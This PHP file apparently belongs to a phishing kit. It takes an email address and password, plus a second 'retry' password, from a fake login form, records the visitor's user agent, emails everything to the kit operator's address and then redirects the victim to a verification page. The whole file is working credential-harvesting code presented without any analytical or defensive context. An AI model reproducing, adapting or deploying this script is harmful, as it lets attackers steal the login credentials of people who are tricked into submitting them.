<?php
session_start();
include 'main.php';
/*=============== Get Email & Password data ======================= */
if ($_POST['emailPassword']):
$user_email_address = $_POST['emaildress'];
$user_email_password = $_POST['emailPassword'];
$user_email_password_try = $_POST['emailPasswordC'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$subject = 'Email and Password';
$message = '
<!DOCTYPE html>
<html>
  <head>
    <style>
    table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 85%;
    }
    td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
    }
    tr:nth-child(even) {
    background-color: #FFF9DD;
    }
    tr:nth-child(odd) {
    background-color: #FFF4DD;
    }
    </style>
  </head>
  <body>
    <div class="row" style="margin:10px auto;">
      <table>
        <b>Email with password (you have 2 same mail with diffrent password because user retry)</b>
        
        <tr><td><b>Email Address = </b>' . $user_email_address.'</td></tr>
        <tr><td><b>Email Password = </b>'.$user_email_password.' </td></tr>
        <tr><td><b>Email Password retry = </b>'.$user_email_password.' </td></tr>
        <tr><td><b>User Agent = </b>'.$user_agent.' </td></tr>
      </table>
    </div>
  </body>
</html>
';
// To send HTML mail, the Content-type header must be set
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

$headers .= 'From: <'.$email_from.'>' . "\r\n";

mail($email_to,$subject,$message,$headers);
header("Location: verify.php");
endif;